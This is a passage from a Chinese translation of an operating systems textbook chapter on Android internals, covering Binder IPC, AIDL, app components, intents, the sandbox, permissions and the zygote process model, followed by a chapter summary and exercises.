只要一个新 的句柄出现在进程之中，此类就将被创建，因此提供了IBinder 的实现，它的transact 方法将为调用创建 适当的事务并将其提交到内核。
因此，我们在前面讨论过的内核事务结构在用户空间API中拆开了：目标由BinderProxy 代表，并且 其数据保存在一个Parcel 之中；事务如我们前面看过的那样流过内核， 一旦出现在接收进程的用户空间 中，它的目标将用来确定适当的接收Binder对象，而一个Parcel将从其数据构造出来并且交付给对象的
onTransact 方法。
于是这三个类使得编写IPC 代码相当容易：
1)从Binder构造子类。
2)实现onTransact 以解码并执行到来的调用。
3)实现对应的代码来创建Parcel, 它可以发送给对象的transact 方法。
进程1 内核 进程2
图10-46 Binder 用户空间API
这一工作的重头戏是最后两步，也就是解组 (unmarshalling) 和编组 (marshalling) 代 码，这些代 码对于将我们更喜欢编写的程序——使用简单的方法调用——转换成执行IPC 所需的操作而言是必需的。
这是写起来乏味的和容易出错的代码，所以我们想要计算机来为我们照看。
3.Binder 接口和AIDL
Binder IPC最后的部分是最经常使用的、基于高级接口的程序设计模型。
在这里我们不是和Binder
对象和Parcel 数据打交道，而是按照接口和方法来思考问题。
这一层主要的部分是一个命令行工具，称为AIDL (Android
Interface Definition Language,Android接口定义语言)。
该工具是 一个接口编译器，它以接口的抽象描述为输入，生成定义接口所必 需的源代码，并且实现适当的编组和解组代码，这样的代码是进行 远程调用所需要的。
图10-47显示了用AIDL 定义的接口的简单例子。
该接口称为 IExample, 它包含单一的方法print,该方法有单一的String参数。
图10-47 用 AIDL 描述的简单接口
像是图10-47这样的接口描述由AIDL 进行编译，生成三个Java 语言类，如图10-48所示。
1)IExample 提供Java 语言接口定义。
2)IExample.Stub 是实现该接口的基类。
它继承自Binder, 这意味着它可以是IPC 调用的接收者；它 继承自IExample, 因为这是正在实现的接口。
这个类的目的是执行解组：将到来的onTransact 调用转换 成IExample 的适当的方法调用。
它的一个子类只负责实现IExample 方法。
3)IExample.Proxy 是IPC 调用的另一端，负责执行调用的编组。
它是IExample 的一个具体的实现， 实现它的每一个方法，将调用转换成适当的Parcel 内容，并且通过与之通信的IBinder 上的transact 调用将 其发送出去。
随着这些类的就绪，就不再需要担心IPC制 。
IExample 接口的实现者只是由IExample.Stub 导出，并 且按照常规实现了接口方法。
调用者将接收一个由IExample.Proxy 实现的IExample 接口，允许它们在接 口上发出常规的调用。
这些部分一同工作并实现一个完整IPC 操作的方式如图10-49所示。
在IExample 接口上的简单的print 调用转换为：
1)将方法调用编组成 一 个Parcel, 调 用 底 层BinderProxy 上 的transact。
2)BinderProxy 构造 一 个内核事务并且通过ioctl 调用将其交付给内核。
3)内核将事务传递给意中的进程，将其交付给 一 个正在其自己的ioctl 调用中等待的线程。
4)事务解码回到一个Parcel, 并且在适当的本地对象上调用onTransact, 在这里本地对象是 ExampleImpl (它是IExample.Stub的一个子类)。
5)IExample.Stub 将 Parcel 解码成适当的方法和参数以便进行调用，这里调用的是print。
6)ExampleImpl 中 print 的具体实现最终会执行。
图10-48 Binder 接口继承层次结构
进程1 进程2
图10-49 基于AIDL的Binder IPC的完整路径
10.8.8 Android应 用
Andriod 提供的应用模型与Linux 脚本下的普通命令行环境以及从图形用户界面启动的应用程序有 很大的不同。
应用程序不再是一个具有主入口的可执行文件，而是一个包含了构成应用程序的所有元素 的容器：程序的代码，图形资源，对系统的声明，以及其他数据。
按 照 约 定 ，Andriod 应 用 程 序 是 一 个 以apk 为 扩 展 名 的 文 件 ， 称 为Android 包 (Android Package)。
这个文件实际上是一个普通的zip 压缩文件，包含了与应用程序相关的所有内容。
apk 文件中的重要文件 内容包括：
1)一个描述应用程序是什么、做什么以及如何运行的清单。
清单必须为应用程序提供一个包名称， 即一个Java 类型的作用域字符串(例如com.android.app.calculator), 以便唯一地标识这个应用程序。
2)应用程序所需要的资源，包括显示给用户的字符串，与布局等描述相关的XML数据，图形位图， 等等。
3)代码本身，这可能是Dalvik 字节码以及本地库代码。
4)签名信息，以安全地标识作者。
应用程序可包含的四种不同的组件类型，在系统中代表着不同的语义和用途。
在所有情况下，都是 以andriod:name 属性提供实现该组件的应用程序代码的Java 类名，它将由系统在需要的时候实例化。
图10-51 AndroidManifest.xml 的基本结构
包管理器(package manager)是 Andriod中用于跟踪所有的应用程序包的部件。
它解析每个应用程 序的清单，收集和索引清单中的信息。
利用这些信息，可以方便用户查询当前安装的应用程序，并检索 与这些应用相关的信息。
它还负责程序的安装(为应用程序创建存储空间并确保apk的完整性),以及程 序的卸载(清理与以前安装的应用程序相关的所有内容)。
将应用程序分解为更细粒度的组件也有助于实现支持应用程序之间互操作和协作的设计目标。
应用 程序可以按照片段的形式发布特定的功能，其他应用程序也可以直接或者间接地利用这些功能。
这一点 将在我们即将详细介绍的四种可发布的组件中说明。
1.活动
活动 (activity) 是应用程序通过用户界面与用户直接交互的部分。
当用户在其设备上启动应用程 序时，实际上应用程序中的一个活动已被指定为主入口。
应用程序执行了这个活动中负责与用户交互 的代码。
图10-51所示的电子邮件清单示例包含两个活动。
第一个是主邮件用户界面，使得用户可以查看他 们的邮件，第二个是用于编写新消息的独立界面。
第一个邮件活动被声明为应用程序的主入口，也就是 说，它是用户从主屏幕启动应用程序时将会开启的活动。
由于第一个活动是主活动，因此它将在应用程序从主启动器启动的时候展示给用户。
如果用户将其 启动，系统将会处于图10-52所示的状态。
这里的活动管理器(图中左边部分)在其进程中创建了一个 内 部ActivityRecord 实例来跟踪活动。
一个或者多个这样的活动被组织到任务(task) 容器中，它大致对 应于用户的应用过程。
此时，活动管理器启动了电子邮件应用程序的进程及其MainMailActivity 实例以 便显示其主UI, 这个实例与其相应的ActivityRecord 关联。
这个活动处于被恢复 (resumed) 的状态，因 为它现在位于用户界面的前台。
图10-52 开启电子邮件应用程序的主活动
如果用户现在离开电子邮件应用程序(不退出),并启动相机应用程序来拍摄照片，那么我们将处 于图10-53所示的状态。
注意，我们现在有一个新的相机进程来运行相机的主活动，即活动管理器中一 个与之相关的ActivityRecord,而且它现在是恢复的活动。
之前的电子邮件活动也发生了一些有趣的事 情：它现在不是被恢复而是被停止了，ActivityRecord 维护着这个活动的保存状态。
当一个活动不再位于前台时，系统会要求它保存当前的状态。
这涉及应用程序创建代表用户当前所 看内容的少量状态信息，然后将这个状态信息返回给活动管理器并存储在system_server 进程中。
活动的 保存状态通常是很小的，包含你在电子邮件中滚动的位置之类的信息，而不是消息本身，消息本身由应
470 第 1 0 章
用程序存储在其永久存储器中另外的位置。
system_server 进程中的活动管理器 相 机App 进 程
图10-53 在电子邮件之后开启相机应用程序
回想一下，尽管Andriod 也需要分页(它可以分页进出已经被磁盘上的文件(如代码)映射过的未 用的RAM), 但它并不依靠交换内存空间。
这意味着应用程序进程中所有已被使用的RAM页面必须保留 在RAM中。
将电子邮件的主活动状态安全地存储在活动管理器中，为系统在处理交换来的内存时提供 了一定的灵活性。
system_server 进程中的活动管理器 相机App进程
图10-54 移除电子邮件进程以便为相机进程申请内存
我们示例的电子邮件应用程序不仅有一个主UI 活动，还包括了另一个ComposeActivity 。
应 用 程 序 可以申明它需要的任意数量的活动。
这可以帮助组织应用程序的实现，更重要的是它可以用于实现跨应 用的交互。
例如，ComposeActivity 的参与是Android 的跨应用分享系统的基础。
当用户在使用相机应用 程序时想分享她拍摄的一张照片，而我们的电子邮件应用程序的ComposeActivity 正是她的一个分享选项 之一。
当这个选项选中时，相应的活动将被启动并分享照片(稍后我们将看到相机应用程序是如何找到 电子邮件应用程序的ComposeActivity 的)。
在图10 - 54的活动状态下执行该分享选项，将会进入图10 - 55所示的新状态。
有 一 些重要的事件需要注意：
1 ) 电 子 邮 件 应 用 程 序 的 进 程 必 须 重 启 ， 以 运 行 其ComposeActivity。
2)但是，旧的MailMainActivity 在此时并不启动，因为并不需要它。
这可以减少RAM的使用。
3)相机的任务中现在有两项记录：我们刚才所在的原始CameraMainActivity, 以及现在显示的新 ComposeActivity 。
对于用户来说，这些仍然是同 一 个连贯的任务，即当前与之交互的用来发送照片的相机应用程序。
4)新的ComposeActivity 被置顶，因此它被恢复；之前的CameraMainActivity 不再置顶，因此它的状 态被保存。
如果其他地方需要它的RAM, 在此时我们可以安全地退出这一进程。
system_server 进程中的活动管理器 电子邮件App 进 程
图10-55 通过电子邮件应用程序分享一张相机照片
最后，让我们看看如果用户在最后一个状态(即撰写电子邮件来分享照片)期间离开相机任务返回 到电子邮件应用程序，将会发生什么。
图10-56展示了系统将处于的新状态。
注意，我们已经将电子邮
件任务的主活动返回到前台。
这使得MailMainActivity 成为前台活动，但是目前还没有任何实例在应用 程序的进程中运行 。
system_server 进程中的活动管理器 电子邮件App 进 程
任务：电子邮件
ActivityRecord (MailMainActivity)
任务：相机
ActivityRecord
(ComposeActivity)
存储的状态
ActivityRecord
(CameraMainActivity) 存储的状态
MailMainActivity
ComposeActivity
相机App 进程
CameraMainActivity
图10-56 返回电子邮件应用程序
2)它可以作为其他应用或者系统与当前应用程序发生丰富交互的连接点。
这可以被应用程序用来为 其他程序提供安全的API, 例如执行图像或者音频的处理、提供文本到语音的转换等。
system_server 进程中的活动管理器 电子邮件App进程
ServiceRecord
(SyncService)
3.接收器
接收器 (receiver) 是发生的(通常是外部的)事件的接收者，这些事件一般发生在后台和正常的 用户交互之外。
接收器在概念上与明确注册的在感兴趣事件(例如报警关闭、数据连接更改等)发生时 可回调的应用程序相同，但是不需要应用程序一直运行以接收事件。
图10-51的电子邮件示例清单包含了一个接收器，它可以让应用程序发现设备的存储空间何时变得 过低，以便停止同步电子邮件(同步可能会占用更多的存储空间)。
当设备的存储空间变得过低时，系 统会发送具有低存储代码的广播，以便传送给所有对这一事件感兴趣的接收器。
system_server 进程中的活动管理器 电子邮件App进程
图10-60说明了活动管理器是怎样处理这种广播，以将其传递到所有感兴趣的接收器的。
它首先向 包管理器请求一个包含所有对这一事件感兴趣的接收器的列表，该列表放置在代表该广播的 BroadcastRecord 中。
活动管理器然后遍历列表中的每个条目，使每个相关的应用程序的进程创建并执行 相应的接收器类。
system_server 进程中的活动管理器 日历App进程
图10-60 发送一个广播到应用接收器
接收器仅作为一 次性操作运行。
当事件发生时，系统找到对其感兴趣的接收器，将该事件递送给它 们，一旦这些接收器处理了该事件，它们也就完结了。
没有类似我们已看到的其他应用程序组件的 ReceiverRecord, 因为特定的接收器在单个广播的持续时间内只是 一个暂时的实体。
每当向接收器组件 发送新的广播时，就创建该接收器类的新实例。
4. 内容提供器
我们的最后 一 个应用程序组件内容提供器 (content provider),是应用程序之间彼此交换数据的主
要机制。
与内容提供器之间的所有交互都是通过 “content: 主 题 ” 这 种URI 完 成 的 ，URI 的权限是用来 找到正确的可交互的内容提供器。
例如，在图10-51的电子邮件应用程序中，内容提供器指出其权限是com.example.email. provider.email 。
因此在此内容提供器上的URI 操作将这样开始
content://com.example.email.provider.email/
该 URI 的前缀由内容提供器自身来解析，用以确定其中的哪些数据将要被访问。
在这个例子中， 一 个常见的约定是URI
474 第 1 0 章
content://com.example.email.provider.email/messages 代表所有的电子邮件的列表，而
content://com.example.email.provider.email/messages/1 提供对键值为1的单条信息的访问。
为了与内容提供器交互，应用程序通常通过一个称为ContentResolver 的系统API 来实现，其中的大 部分方法都有一个初始的用以指定要操作的数据的URI参数。
最常用的ContentResolver 方法之一是query, 它对给定的URI 执行数据库查询，并返回一个Cursor 用于检索结构化的结果。
例如，检索所有可用电子 邮件的概览类似如下的形式：
query("content://com.example.email.provider.email/messages")
1)应用程序调用ContentResolver.query 来启动查询操作。
2)URI 的权限交到活动管理器，以便活动管理器(通过包管理器)找到相应的内容提供器。
3)如果相应的内容提供器尚未运行，则会创建它。
4)一旦创建，内容提供器将其实现系统IContentProvider 接口的IBinder 返回给活动管理器。
5)返回内容提供器的IBinder 到 ContentResolver。
6)内容解析器现在可以通过在AIDL 接口上调用相应的方法来完成初始的查询操作，并返回Cursor 结果。
system_server 进程中的活动管理器 电子邮件App 进程
图10-61 与内容提供器交互
内容提供器是执行跨应用交互的关键机制之一。
例如，如果我们回到之前的图10-55中描述的跨应 用分享系统，内容提供器是数据实际传输的方式。
此操作的完整流程为：
1)创建包含待分享数据的URI的分享请求，并将其提交给系统。
2)系统向ContentResolver 询问该URI 对应的数据的MIME 类型。
这与我们刚刚讨论的query 方法非常 类似，但是只要求内容提供器返回一个关于URI的MIME 类型的字符串。
3)系统查找所有可以接受标识为该MIME 类型的数据的活动。
4)显示一个用户界面，以便用户从可能的接收者中选择一个。
5)当一个活动被选中后，系统启动它。
6)分享处理活动接收要分享的数据的URI, 通 过ContentResolver 检索其数据，并执行其相应的操作： 创建邮件，存储邮件，等等。
实例研究1: UNIX、Linux和Android 475
10.8.9 意 图
我们尚未在图10-51所示的应用程序清单中讨论的一个细节，是<intent-filter> 标签及包含它的活动 和接收器的声明。
这是Android的意图 (intent) 功能的一部分，也是不同应用程序之间能够互相识别以 便进行交互和协同工作的基础。
意图主要分两种：显式意图和隐式意图。
显式意图(explicit intent) 直接指定一个准确的应用程序 组件，相当于在Linux shell中给一条指令提供一条绝对路径。
对于显式意图，最重要的是两个用来命名 组件的字符串：目标应用程序的封装名，以及该应用程序中组件的类名。
参照图10-51所示应用程序和 图10-52所示的活动，该组件中就包含一个封装名为com.example.email 、 类名为com.example.email.
MailMainActicity的显式意图。
用一个显式意图的封装名和类名就能获得足够信息来识别唯一的目标组件，例如图10-52中的主邮 件活动。
封装管理器可以通过封装名来返回应用程序需要的任何信息，例如源码位置等。
通过类名，可 以得知需要执行的是哪部分源码。
隐式意图 (implict intent) 描述所需组件的特点，而并不直接指向该组件。
这相当于在Linux shell 中，给shell提供一条指令名，随后shell使用搜索路径来寻找一条待运行的具体指令。
这个寻找与隐式意 图相匹配的组件的过程叫作意图解析 (intent resolution)。
Android的通用共享功能就是隐式意图的一个典型例子。
如图10-55中所示，用户通过邮件应用程序 来分享由相机拍摄的照片。
此处，相机应用生成一条意图，描述了需要完成怎样的操作，随后系统找到 所有可能完成这一操作的活动。
意图android.intent.action.SEND 发起了一个分享操作的要求，然后如图 10-51所示，邮件应用程序的compose活动声明了它能够进行这个操作。
意图解析有三个可能的结果：(1)没有找到匹配的活动，(2)仅找到一个匹配的活动，(3)找到了 多个能够处理该意图的活动。
空的匹配会导致空的结果或者一个异常，这取决于调用者在该处的期望返 回类型。
如果仅有一个匹配结果，系统会立即执行这个意图，此时它已转为显式意图。
如果有多个匹配 结果，则需要寻找其他解析方法，使得结果唯一。
如果一个意图被解析为多个可能的活动，则不能同时执行它们，而是需要挑选一个执行。
这个过程 在封装管理器中实现。
如果封装管理器需要将一个意图解析为一个活动，而它发现有多个匹配的活动， 那么它将把这个意图解析为一个搭建在系统中的名为ResolverActivity的特殊活动。
这个活动在执行时 会向封装管理器请求该意图所对应的匹配活动列表，显示给用户并要求用户选择其中一个。
做出选择之 后，它根据原意图和用户选择的活动创建一个新的显式意图，通知系统运行该活动。
Android 与Linux shell还有另一个相似之处，即Android的图形界面——启动器，与其他任何应用程 序一样运行在用户空间中。
Android 的启动器可以调用封装管理器来寻找可执行的活动，在用户做出选 择之后开始执行。
10.8.10 应用程序沙箱
作为一种传统，在操作系统中，应用程序被视为由用户执行的一些代码。
这个行为是从命令行时代 继承下来的。
在命令行中，如果你输入1s指令，那么它是由你的身份(UID) 运行的，拥有和你相同的 系统权限。
同样，当你用图形用户界面来运行一个你想玩的游戏时，这个游戏将会以你的身份运行，可 以访问你的文件，包括很多它其实并不需要访问的东西。
然而这并不是我们现在使用计算机的普遍方式。
我们会运行一些从可信度较低的第三方来源得到的 应用程序，其功能十分繁多，我们很难控制其在它们自己的运行环境中进行的诸多种类的大量操作。
操 作系统支持的应用程序模型和实际使用的应用程序之间存在着不一致的现象。
这种现象可以用一些策略 来缓和，比如区分普通用户和“管理员”用户的权限，在第一次运行某个应用程序时弹出提醒。
但这些 策略并未真正指出背后的这些不一致的现象。
换言之，传统操作系统善于保护一个用户不受其他用户的影响，而并不擅长保护用户不受自己的影
在Android的实现中，这个理念通过用户ID相当直接地表达出来。
当安装一个Android 应用程序时， 为其新创造一个独特的Linux 用户ID (也称UID), 该应用程序的所有源码是以该新“用户”的名义运行 的。
这样，Linux 用户ID 为每个应用程序创造一个沙箱，配备各自的隔离区来储存文件系统，如同为用 户在桌面系统中创造沙箱一样。
换言之，Android 创新地活用了Linux中已有的一个功能，造成了隔离性 更好的结果。
10.8.11 安全性
Android的应用程序安全性围绕着UID 展开。
在Linux中，每个进程在运行时拥有一个独特的UID, Android 使用UID来识别与保护安全屏障。
进程进行交互的唯一手段是利用跨进程通信 (IPC) 机制，携 带足以使它识别调用者的信息。
捆绑 (binder)IPC 在每个跨进程的事务中明确包含了这些信息，确保 IPC的接收者能简单地请求调用者的UID。
Android 为系统底层预先定义了一系列标准UID, 但大多数应用程序是在其第一次运行或安装时，
从“应用程序UID” 范围中获得动态分配的UID的。
图10-62给出了一些常用UID值与用途的映射。
小于 10000的UID 是固定分配给系统的，专门用于硬件 或系统实现的具体部件，这里列出了一些典型UID 值。
处于10000～19999范围的UID是在应用程序第 一次安装时，由封装管理器动态分配给应用程序的， 这表示一个系统上最多可安装10000个应用程序。
注意从100000开始的范围是用来实现Android 的传 统多用户模型的：如果一个应用程序自身的UID 是
图10-62 Android的常用UID分配
10002,那么当第二个用户运行该应用程序时，它将被识别为110002。
当一个应用程序首次被分配一个UID时，随之将创造一个新的存储目录，用来存储这个UID拥有的 文件。
应用程序可以自由访问该目录中它的私有文件，但不能访问其他应用程序的文件。
反过来，其他 应用程序也不能访问它的文件。
这就使得内容提供器变得十分重要，在前面关于应用程序的章节中已经 讨论过，因为它们是能在应用程序之间传递信息的少数几个机制之一。
即使拥有UID 1000的系统自身也不能访问应用程序拥有的文件。
因此需要守护进程installd: 它拥 有特殊权限，运行时可以在其他应用程序的目录中访问和创建文件。
Installd 进程向封装管理器提供十分 有限的应用程序编程接口 (API), 以便后者创建和管理应用程序需要的数据目录。
在一般状态下，Android 应用程序沙箱必须禁止可能危害相关应用程序安全性的一切跨应用程序通信。
这样做是为了鲁棒性(防止一个应用程序使另一个应用程序崩溃),但更多是为了维护信息访问安全。
考虑我们的相机应用程序。
当用户拍照时，相机应用程序将拍到的图片存储在它的私有数据空间内， 任何其他应用程序都不能访问。
这正是我们想要的，因为图片可能包含用户的敏感信息。
用户拍照之后，她可能想要发送给一位朋友。
电子邮件是另一个独立的应用程序，存在于它自己的 沙箱之中，无权访问相机应用程序里的照片。
那么如何让电子邮件应用程序能够访问相机应用程序沙箱 里的照片呢?
Android 最著名的访问控制形式是应用程序权限。
权限是在应用程序安装时，赋予给它的详细定义 的权力。
应用程序列出它需要的权限清单，在安装之前通知用户，使用户得知应用程序在此基础上可进 行哪些操作。
图10-63展示了电子邮件应用程序如何使用权限来访问相机应用程序中的图片。
在此例中，相机应 用程序将READ_PICTURES 权限与它内部的图片关联，表示任何拥有该许可的应用程序都可以访问它的 图片数据。
电子邮件应用程序在它的清单中声明需要该权限。
这样，电子邮件应用程序就可以访问相机 应用程序拥有的一个资源标识符 (URI), 即 content://pics/1 。
一旦收到这个URI请求，相机应用程序的 内容提供器就会询问封装管理器，确定调用者是否拥有所需的权限。
如果拥有，则调用成功，合适的数 据将返回到应用程序中。
system_server 进程中的封装管理器
图10-63 请求并使用许可
图10-64展示了应用程序未拥有其需要执行的操作对应的权限时的情景。
这里，浏览器应用程序正 试图直接访问用户的图片，但它只拥有一个关于互联网操作的权限。
这时，PicturesProvider 由封装管理 器得知调用者进程并未拥有所需的READ_PICTURES 权限，结果会向调用者抛出一个安全性异常。
system_server 进程中的封装管理器
图10-64 无权限情况下试图访问数据
权限能够提供对于操作和数据类的广泛、无限制的访问。
在应用程序的功能是围绕着这些操作展开 的情况下，权限能够正常工作，例如我们的电子邮件应用程序要求INTERNET 许可来收发邮件。
然而， 电子邮件应用程序是否应该持有READ_PICTURES 权限呢?
电子邮件应用程序并不直接与读取用户照片 的功能相关，因此它没有理由有权限访问你的所有图片。
这里，有两个问题需要解决。
第一，我们不希望允许应用程序访问他们并不实际需要的大量数据。
第二，需要允许应用程序访问来自任何源的数据，包括那些它们没有先验知识的数据。
这里需要进行一项重要的观察：用电子邮件发送图片的行为，事实上是一个意图明确的用户交互行 为——用一个特定的应用程序发送一幅特定的图片。
只要操作系统参与了此交互行为，这项观察就能在 两个应用程序沙箱上打开洞口，允许数据的传递。
Android 支持这种存在于意图和内容提供器之间的隐式安全数据访问。
图10-65展示了在我们用电子 邮件发送图片的例子中，这种访问是如何进行的。
左下角的相机应用程序创建了一个分享它的一幅图片 content://pics/1 的意图。
在启动先前见过的编写邮件应用程序的同时，“已授权URI” 列表中也增添一项， 表示新的ComposeActivity 现已获得此URI的访问权限。
当ComposeActivity 试图访问并读取它被赋予的此 URI 时，照相机应用程序中拥有图片资料的PicturesProvider 则会向封装管理器询问，调用者邮件应用程 序是否有权访问数据，答案为是，于是图片返回给邮件应用程序。
system_server 进程中的活动管理器 相机App进程
图10-65 用内容提供器来分享图片
图10-66展示了上述这种新的流程。
除去两个应用程序的活动的组合方式存在不同之外，图10-66与 图10-65几乎完全相同。
在图10-66中，图片选择活动由邮件应用程序在相机应用程序中发起。
一旦图片 被选定，其URI 会被返回到邮件应用程序中，这时此URI授权会被活动管理器记录下来。
因为这种方法允许系统来维护每个应用程序的数据的严格控制，在用户不知情的情况下允许所需数 据的精确访问，因而它是十分强力的。
很多用户交互行为也从中受益，如用拖动放下来创建一个相似的 URI授权。
但Android也利用其他信息(如窗口焦点),来确定应用程序能够进行何种交互行为。
system_server 进程中的活动管理器 相机App 进程
Android 使用的最后一种常用的安全性措施是允许/禁止特定类型访问的明确用户界面。
这种措施为 应用程序提供了一些方式，告知用户其可提供一些功能，并通过一个受系统支持的可信任用户界面来让 用户控制这些访问权限。
Android的系统设定中包括一个选择输入法的用户界面。
这个界面显示所有已安装的应用程序中可 用的输入法，以及它们是否被启用。
如果用户希望使用一种新的输入法，那么在完成安装相应的应用程 序后，用户需要进入这个系统设定用户界面来启用它。
启用时，系统同时也会通知用户此行为会允许该 应用程序执行何种操作。
10.8.12 进程模型
Linux的传统进程模型是用fork指令来创建新进程，然后用exec 指令使用待运行的源码初始化该进程 并开始执行。
shell 负责实现进程执行、创建新进程、执行所需的进程来运行shell 指令。
当指令结束时， 进 程 被 从Linux 中 移 除 。
Android 使用的进程有些不同。
在之前的应用程序章节中已有讨论，活动管理器是Android 负 责 正 在
运行的应用程序的管理的一部分。
活动管理器协调新应用程序进程的启动，决定哪些应用程序能在其中 运行，哪些已不再需要。
1.启动进程
为了启动新进程，活动管理器需要与zygote 通信。
活动管理器首先开始，它创建一个与zygote 相连 的专用接口，通过接口发送一条指令，表示它需要启动一个进程。
这条指令主要描述需要创建的沙箱： 新进程运行所需的UID, 以及需要遵守的安全性制约。
zygote 需要作为根来运行：创建新进程时，它合 理配置运行所需的UID, 最终下放根权限，将进程改为该UID。
图10-67展示了在一个新进程中启动活动的流程。
图中每一步的细节如下：
1)某个现有进程(如应用程序启动器)调用活动管理器，发出意图，描述它想要启动的新活动。
2)活动管理器要求封装管理器将这个意图解析为一个明确的组件。
3)活动管理器判断这个应用程序的进程并未正在运行，然后向zygote请求一个具有合适UID的新进程。
4)zygote 进行一次fork 指令，克隆自己来创造一个新进程，下放权限并配置新进程的UID 和沙箱， 初始化该进程的Dalvik, 使得Java runtime开始完全执行。
例如，它需要在fork 后启动垃圾收集等线程。
5)新进程如今是一个zygote 的克隆，并运行着完全配置好的Java 环境。
它回调活动管理器，询问后 者“我该做什么”。
6)活动管理器返回即将启动的应用程序的完整信息，如源码位置等。
7)新进程读取应用程序的源码，开始运行。
8)活动管理器将所有即将进行的操作发送给新进程，在此处为“启动活动X”。
9)新进程收到指令，启动活动，实体化合适的Java 类并执行。
注意，当活动启动时，应用程序的进程可能已经正在运行了。
在这种情况下，活动管理器会直接跳 转到末尾，向该进程发送一条新指令，让它实体化并执行合适的组件。
如果合适，这会导致一个额外的 活动实例在应用程序中运行，如图10-56中所示。
system_server进程 应用程序进程
zygote进程
图10-67 启动新应用程序进程的流程
2.进程生命周期
回想Android内核中的内存溢出强制结束指令，使用一个进程的oom_adj 进行严格排序，决定哪个进 程需要优先强制结束。
活动管理器负责基于每个进程的状态，通过将其归类于几个主要用途，从而合理 设定其oom_adj。
图10-68展示了几个主要类别，按重要程度从高到低排序。
最右一栏为属于此类别的进 程被赋予的典型oom_adj 值。
图10-68 主要进程类别
现在我们已经了解了Android 如何决定何时启动进程、如何将进程按重要性归类。
现在我们需要决定 何时退出进程了，没错吧?
我们是否真的需要再做一些事情来退出进程呢?
答案是，我们不需要。
在 Android中，应用程序从不会完全退出。
系统会把不再需要的进程留在那里，依靠内核根据需要中止它们。
3.进程依赖性
现在，我们已经全面了解了单个Android 进程是如何管理的。
然而，存在一个复杂化的问题：进程 之间的依赖性。
进程依赖性会影响两个关键事实：何时创建进程(以及进程内部的组件),进程的oom_adj 重要程度 值是什么。
回想一个进程的重要性取决于其中最重要的组件，一个进程的重要性还取决于依赖它的最重 要的其他进程。
以相机应用程序为例，它的进程和它的内容提供器都不是总在运行的，当某个其他应用程序需要访 问它的内容提供器时才会被创建。
当相机的内容提供器被访问时，相机进程会被认为至少具有与使用它 的应用程序同等的重要程度。
图10-69 进程重要程度的典型状态
图10-70 电子邮件应用程序不再使用相机应用程序后的进程状态
这两个例子对缓存进程的重要性进行了最终展示。
当电子邮件应用程序再一次需要使用相机内容提 供器时，其对应的进程一般已经被设定为缓存类别。
而再次使用相机，则只是将该进程提升回前景类别， 并重新建立与内容提供器的连接，而此时内容提供器已经做好数据库初始化等准备工作了。
10.9 小结
Linux 一开始是一个开源的类UNIX系统，而今天它已经广泛应用于各种系统，从智能手机和笔记本 到超级计算机。
它有三种主要接口：shell 、C 函数库和系统调用。
此外，通常使用图形用户界面以简化 用户与系统的交互。
shell 允许用户输入命令来执行。
这些命令可能是简单的命令、管线或者复杂的命令 结构。
输入和输出可以被重定向。
C 函数库包括了系统调用和许多增强的调用，例如用于格式化输出的 printf。
实际的系统调用接口是依赖于体系结构的，在x86平台上大约有250个系统调用，每个系统调用 做需要做的事情，不会做多余的事情。
每个进程的内存模型由三个部分组成：代码、数据和堆栈。
内存管理采用分页式。
一个常驻内存的 表跟踪每一页的状态，页面守护进程采用一种修改过的双指针时钟算法保证系统有足够多的空闲页。
文件系统由文件和目录所组成的层次结构组成。
所有磁盘都挂载到一个有唯一根的目录树中。
文件 可以从文件系统的其他地方连接到一个目录下。
要使用文件，首先要打开文件，这会产生一个文件描述 符用于接下来的读和写。
文件系统内部主要使用三种表：文件描述符表、打开文件描述表和i 节点表。
其中i节点表是最重要的表，包含了文件管理所需要的所有信息和文件位置信息。
目录和设备，以及其 他特殊文件也都表示为文件。
保护基于对所有者、同组用户和其他人的读、写和执行的访问控制。
对目录而言，执行位指示是否 允许搜索。
Android 是一个允许应用程序在移动设备上运行的平台。
它基于Linux 内核，但在Linux 的上层由一 个庞大的软件体组成，并对Linux的内核进行了少量的修改。
Android 的大部分代码是用Java 写的，应用 程序也是用Java 写的，然后依次被编译成Java 字节码和Dalvik 字节码。
Android 应用程序的通信是通过一 种受保护的消息传递实现的，这种消息传递被称为消息事务。
所谓的Binder 则是一种特殊的Linux内核模 型，用来处理进程间的通信。
Android 软件包是自包含的，并含有一个用来描述包中内容的说明文件。
它包含了活动(activities)、 接收器 (receivers) 、 内容提供器 (content providers) 和意图 (intent) 。
Android 的安全模型与Linux 模型 不同，它对每个应用程序都使用了沙箱技术，因为所有的应用程序均被视为不可信的。
习题
1. 解释如何用C编写UNIX 以使其更容易被移植到 新机器。
2.POSIX 接口定义了一组库程序。
解释为什么要 使用POSIX规范库程序，而不是使用系统调用 接口。
3.Linux 在被移植到新架构时依赖于GCC 编译器。
描述这种依赖性的一个优点和一个缺点。
4.一个目录包含以下文件：
aardvark feret koala porpoise unicorn
bonefish grunion llama quacker vicuna
capybara hyena marmot rabbit weasel
dingo ibex nuthatch seahorse yak
emu jellyfish ostrich tuna zebu
哪些文件能通过命令1s [abc]*e*被罗列出来?
5. 下面的Linux shell管线命令的功能是什么?
grep nd xyz |wc-I
6. 基于标准输出写一个能打印z 文件的第八行的 Linux管线命令。
7.标准输出和标准错误对于终端都是默认的， Linux 为什么还要区分两者?
8.一个用户在终端键入如下命令：
a|b|c& d|e|f&
当shell 处理完这些命令后，有多少新的进程在 运行?
9. 当Linux shell命令启动一个进程，它把它的环 境变量，如HOME放到进程栈中，使得进程可 以找到它的home目录。
如果这个进程之后进行 派生，那么它的子进程也能自动地得到这些变 量吗?
10. 在如下的条件下：文本大小=100KB, 数 据 大 小 = 2 0KB, 栈大小=10KB, 任务结构= 1KB, 用户结构=5KB, 一个传统的UINX系 统要花多长时间派生一个子进程?
内核陷阱和 返回的时间用1ms, 机器每50ns就可以复制一 个32位的字。
共享文本段，但是不共享数据段 和堆栈段。
11.当多兆字节程序变得越来越普遍，花费在执行 fork 系统调用以及复制调用进程的数据段和堆 栈段的时间也成比例地增长。
当在Linux 中 执
行fork, 父进程的地址空间是没有被复制的， 不像传统的fork语义那样。
Linux 是怎样防止子 进程做一些会彻底改变fork 语义的行动的?
12.为什么nice指令的负参数要专门保留给超级用户?
13. 非实时Linux 进程的优先级是从100到139,默 认的静态优先级是什么?
如何使用优先值 (nice值)来改变这种优先级?
14.当一个进程进入僵死状态后，剥夺它的内存有 意义吗?
为什么?
15.什么硬件概念与信号量密切相关?
给出两个例 子来说明信号量是如何被使用的。
16. 你认为为什么Linux 的设计者禁止一个进程向 不属于它的进程组的另一个进程发送信号呢?
17.一个系统调用通常用一个软件中断(陷入)指 令来实现。
一个普通的过程调用也能在 Pentium 硬件上使用吗?
如果能使用，在哪种 条件下?
如何使用?
